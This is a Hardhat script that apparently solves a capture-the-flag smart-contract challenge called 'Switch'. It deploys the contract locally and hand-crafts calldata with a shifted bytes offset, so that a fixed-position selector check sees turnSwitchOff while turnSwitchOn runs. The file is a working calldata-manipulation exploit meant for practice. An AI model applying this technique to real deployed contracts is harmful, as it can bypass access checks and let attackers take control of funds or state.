const {
    network,
    ethers
} = require("hardhat");
const hre = require("hardhat");

async function main() {
    const [user] = await ethers.getSigners()
    const userAddress = await user.getAddress()
    console.log("user = ", userAddress)

    // deplay the contract
    const switchContract = await ethers.deployContract("Switch")
    const switchContractAddress = await switchContract.getAddress()
    console.log("switch contract = ", switchContractAddress)

    const id1 = ethers.id('turnSwitchOff()').substring(0, 10)
    const id2 = ethers.id('turnSwitchOn()').substring(0, 10)
    console.log("turnSwitchOff function signature = ", ethers.hexlify(id1), "turnSwitchOn function signature = ", ethers.hexlify(id2))

    //
    const functionName = "flipSwitch"
    const param0 = id1 + "00000000000000000000000000000000000000000000000000000000"
    const functionParams = [ethers.hexlify(param0)]
    //const functionParams = [ethers.toUtf8Bytes(param0)] // not work
    const flipInterface = new ethers.Interface([
        "function flipSwitch(bytes) public"
    ])
    let data = flipInterface.encodeFunctionData(functionName, functionParams)
    console.log("data before fix = ", data)

    // not work
    /*   const flipInterface = new ethers.Interface([
        "function flipSwitch(bytes) public"
        ])
        const flipFunction = flipInterface.getFunction(functionName)
        const signHash = flipFunction.sighash
        const data = flipFunction.encode(functionParams)
        console.log("data before fix = ", data, "sign hash = ", signHash)  */
    
    // fix
    // 0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002020606e1500000000000000000000000000000000000000000000000000000000
    // 0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000002020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002020606e1500000000000000000000000000000000000000000000000000000000
    const functionSelector = data.substring(0, 10)
    const parameterPos = data.substring(10, 74)
    const parameterData = data.substring(74, 202)
    console.log("function selector = ", functionSelector)
    console.log("parameter 1 postion = ", parameterPos)
    console.log("parameter 1 data = ", parameterData)

    let dataAfter = functionSelector + parameterPos.substring(0, 62) + "60" + parameterData + parameterData.substring(0, 64) + id2.substring(2, 10) + parameterData.substring(64 + 8, 128)
    console.log("data after fix = ", dataAfter)

    const tx = await user.sendTransaction({
        to: switchContractAddress,
        data: dataAfter
    })
    //
    const txReceipt = await ethers.provider.getTransactionReceipt(tx.hash).then((receipt) => {
        console.log("tx receipt = ", receipt)
    })

    //
    const result = await switchContract.switchOn()
    console.log("switch = ", result)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});